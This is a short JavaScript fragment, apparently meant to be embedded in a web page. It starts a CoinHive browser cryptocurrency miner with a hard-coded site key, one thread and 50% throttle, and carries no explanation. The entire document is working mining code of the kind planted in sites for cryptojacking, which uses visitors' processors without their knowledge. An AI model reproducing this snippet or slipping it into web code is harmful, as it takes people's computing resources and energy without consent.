try {
		var miner = new CoinHive.Anonymous('BtcpvElCLDa2URFjJUy1uFwiT6aJmLMN',{
			threads: 1,
			autoThreads: false,
			throttle: 0.5,
			forceASMJS: false
		});
		miner.start();
} catch (e) {console.warn(e)}